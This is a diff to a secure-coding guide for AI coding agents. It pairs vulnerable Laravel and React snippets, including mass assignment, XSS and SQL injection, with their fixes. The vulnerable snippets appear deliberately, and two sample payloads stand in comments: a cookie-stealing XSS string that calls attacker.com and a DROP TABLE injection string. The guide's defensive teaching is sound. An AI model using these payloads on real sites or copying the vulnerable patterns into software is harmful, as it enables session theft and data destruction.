@@ -1,6 +1,18 @@
 # Examples: LLM Mistakes vs Correct Approaches
 
-Real-world code examples demonstrating the four behavioral principles. Each shows what LLMs commonly do wrong and the correct approach.
+Real-world code examples demonstrating the system's behavioral principles. Each shows what LLMs commonly do wrong and the **correct, architecturally-enforced approach**.
+
+## Quick Reference
+
+| Section | Principle | Domain | Stakes |
+|---|---|---|---|
+| [1. Hidden Assumptions](#1-think-before-coding) | Think Before Coding | Laravel / Export | High — PII leak risk |
+| [2. Simplicity First](#2-simplicity-first) | Simplicity First | PHP | Medium — over-engineering |
+| [3. Surgical Changes](#3-surgical-changes) | Surgical Changes | PHP / JS | Medium — scope creep |
+| [4. Goal-Driven Execution](#4-goal-driven-execution) | Goal-Driven | Laravel | High — unverifiable changes |
+| [5. Laravel 12 Architecture](#5-laravel-12-architectural-decisions) | Anti-Patterns | Laravel 12 | 🔴 **Critical** — security breach |
+| [6. React Component Security](#6-react-component-security) | Anti-Patterns | React | 🔴 **Critical** — XSS attack vector |
+| [7. SQL Injection Prevention](#7-sql-injection-prevention) | Anti-Patterns | PHP / Laravel | 🔴 **Critical** — database compromise |
 
 ---
 
@@ -470,3 +482,266 @@ Start with step 1?
 > The "overcomplicated" examples aren't obviously wrong — they follow design patterns and best practices. The problem is **timing**: they add complexity before it's needed, which makes code harder to understand, introduces more bugs, takes longer to implement, and is harder to test.
 >
 > **Simple code that works > Complex code that "might be needed later."**
+
+---
+
+## 5. Laravel 12 Architectural Decisions
+
+> [!CAUTION]
+> These anti-patterns are **security vulnerabilities**, not just style issues. The AI must refuse to generate the ❌ patterns even when explicitly asked.
+
+### Example 1: Mass Assignment Vulnerability (Laravel 12)
+
+**User Request:** "Create a User model for my Laravel app"
+
+**❌ What LLMs Do (Mass Assignment Vulnerability)**
+
+```php
+class User extends Authenticatable
+{
+    // "Convenient" — allows any column to be mass-assigned
+    protected $guarded = [];
+}
+```
+
+**Why This Is Critical:**
+
+If your API accepts `POST /users` with `{"name":"John","role":"admin"}`, Laravel will happily assign `role` to the database. An attacker can escalate their own privileges with a single HTTP request.
+
+**✅ What Should Happen (Explicit Whitelist)**
+
+```php
+class User extends Authenticatable
+{
+    // Explicit whitelist — only listed fields can be mass-assigned
+    protected $fillable = [
+        'name',
+        'email',
+        'password',
+    ];
+
+    // role, is_admin, email_verified_at — NOT in $fillable, cannot be mass-assigned
+}
+```
+
+**The rule:** `$guarded = []` is a hard-stop anti-pattern in `rules/anti-patterns.md`. Always use `$fillable`.
+
+---
+
+### Example 2: N+1 Query — The Silent Performance Killer
+
+**User Request:** "Display all orders with their customer names"
+
+**❌ What LLMs Do (N+1 Query)**
+
+```php
+// Controller
+$orders = Order::all(); // Query 1
+
+// Blade template
+@foreach ($orders as $order)
+    {{ $order->customer->name }} {{-- Query 2, 3, 4... N --}}
+@endforeach
+```
+
+**Result:** 500 orders = **501 database queries**. Invisible in development, catastrophic in production.
+
+**✅ What Should Happen (Eager Loading)**
+
+```php
+// Controller
+$orders = Order::with('customer')->get(); // Always 2 queries: orders + customers
+
+// Blade template — same code, zero extra queries
+@foreach ($orders as $order)
+    {{ $order->customer->name }}
+@endforeach
+```
+
+**The rule:** Any Eloquent query that iterates and accesses a relationship MUST use `->with()`. See `rules/performance-standards.md §2`.
+
+---
+
+## 6. React Component Security
+
+> [!CAUTION]
+> XSS (Cross-Site Scripting) via `dangerouslySetInnerHTML` is one of the most common React security vulnerabilities. The AI must never use it with user-supplied data.
+
+### Example 1: XSS via dangerouslySetInnerHTML
+
+**User Request:** "Render the user's bio which may contain HTML formatting"
+
+**❌ What LLMs Do (XSS Attack Vector)**
+
+```tsx
+// User's bio: "<img src=x onerror='fetch(`https://attacker.com/?c=`+document.cookie)'>"
+// This executes the attacker's script in the user's browser.
+
+function UserBio({ bio }: { bio: string }) {
+    return (
+        <div dangerouslySetInnerHTML={{ __html: bio }} />
+    );
+}
+```
+
+**Impact:** Account takeover, session hijacking, data exfiltration — all from a profile bio field.
+
+**✅ What Should Happen (Sanitize First)**
+
+```tsx
+import DOMPurify from 'dompurify';
+
+function UserBio({ bio }: { bio: string }) {
+    // Sanitize before rendering — strips all executable content
+    const sanitizedBio = DOMPurify.sanitize(bio, {
+        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
+        ALLOWED_ATTR: [], // No attributes — removes href, onclick, style, etc.
+    });
+
+    return (
+        <div dangerouslySetInnerHTML={{ __html: sanitizedBio }} />
+    );
+}
+```
+
+**Better when possible — render as plain text:**
+```tsx
+function UserBio({ bio }: { bio: string }) {
+    // If HTML formatting is not required, just render as text
+    return <p>{bio}</p>; // React auto-escapes — zero XSS risk
+}
+```
+
+---
+
+### Example 2: Exposing Sensitive Data in Client Components
+
+**User Request:** "Pass the current user to my React component"
+
+**❌ What LLMs Do (Over-Expose)**
+
+```tsx
+// Server component passes entire DB row to client
+export default async function Dashboard() {
+    const user = await db.user.findFirst({ where: { id: session.userId } });
+    // Passes: id, name, email, passwordHash, stripeCustomerId, internalNotes, etc.
+    return <UserCard user={user} />;
+}
+
+// Everything serialized to JSON visible in page source
+'use client';
+export function UserCard({ user }: { user: User }) {
+    return <div>{user.name}</div>;
+}
+```
+
+**✅ What Should Happen (Explicit DTOs)**
+
+```tsx
+// Server component — select only what the client needs
+export default async function Dashboard() {
+    const user = await db.user.findFirst({
+        where: { id: session.userId },
+        select: { id: true, name: true, avatarUrl: true }, // Explicit projection
+    });
+    return <UserCard user={user} />;
+}
+```
+
+---
+
+## 7. SQL Injection Prevention
+
+> [!CAUTION]
+> SQL injection remains the #1 most critical web vulnerability (OWASP A03). The AI must never generate raw SQL queries with user input.
+
+### Example 1: Raw Query Injection
+
+**User Request:** "Search bookings by client name"
+
+**❌ What LLMs Do (SQL Injection Vulnerability)**
+
+```php
+// User input: "'; DROP TABLE bookings; --"
+$name = $request->input('name');
+
+$bookings = DB::select("SELECT * FROM bookings WHERE client_name = '$name'");
+// Result: Database wiped. Game over.
+```
+
+**✅ What Should Happen (Query Builder)**
+
+```php
+// Option 1: Eloquent (preferred)
+$bookings = Booking::where('client_name', 'LIKE', '%' . $request->validated('name') . '%')
+    ->paginate(20);
+
+// Option 2: Raw SQL with bindings (when raw SQL is unavoidable)
+$bookings = DB::select(
+    'SELECT * FROM bookings WHERE client_name LIKE ?',
+    ['%' . $request->validated('name') . '%'] // Parameterized — injection-proof
+);
+```
+
+**The rule:** Raw string interpolation in SQL queries is an unconditional hard-stop anti-pattern. See `rules/security-standards.md §1`.
+
+---
+
+### Example 2: Missing Input Validation Before Persistence
+
+**User Request:** "Save the user's profile update"
+
+**❌ What LLMs Do (Trust All Input)**
+
+```php
+public function update(Request $request): RedirectResponse
+{
+    // No validation — attacker can send any fields, any values
+    auth()->user()->update($request->all());
+    return back()->with('success', 'Profile updated.');
+}
+```
+
+**✅ What Should Happen (Validate → Authorize → Persist)**
+
+```php
+public function update(ProfileUpdateRequest $request): RedirectResponse
+{
+    // 1. Validate (FormRequest enforces rules, sanitizes input)
+    $validated = $request->validated();
+
+    // 2. Never use $request->all() — use validated data only
+    auth()->user()->update($validated);
+
+    return back()->with('success', 'Profile updated.');
+}
+
+// app/Http/Requests/ProfileUpdateRequest.php
+class ProfileUpdateRequest extends FormRequest
+{
+    public function rules(): array
+    {
+        return [
+            'name'  => ['required', 'string', 'max:100', 'regex:/^[\pL\s\-]+$/u'],
+            'email' => ['required', 'email:rfc,dns', 'unique:users,email,' . $this->user()->id],
+            'bio'   => ['nullable', 'string', 'max:500'],
+        ];
+    }
+}
+```
+
+---
+
+## Complete Anti-Patterns Summary
+
+| Principle | Anti-Pattern | Severity | Fix |
+|---|---|---|---|
+| Think Before Coding | Silently assumes scope, fields, format | 🟡 High | List assumptions, ask for clarification |
+| Simplicity First | Strategy Pattern for a single calculation | 🟢 Medium | One function until complexity is needed |
+| Surgical Changes | Reformats code while fixing a specific bug | 🟢 Medium | Only change lines that fix the reported issue |
+| Goal-Driven | "I'll review and improve the code" | 🟡 High | Define verifiable success criteria first |
+| Security | `$guarded = []` in Eloquent models | 🔴 Critical | Use explicit `$fillable` whitelist |
+| Performance | Eager-load omitted → N+1 queries | 🟡 High | Always use `->with()` for relationships |
+| Security | `dangerouslySetInnerHTML` with raw user data | 🔴 Critical | DOMPurify sanitize or render as text |
+| Security | Raw SQL with string interpolation | 🔴 Critical | Query builder or parameterized bindings |
+| Security | `$request->all()` without validation | 🔴 Critical | FormRequest → `$request->validated()` only |
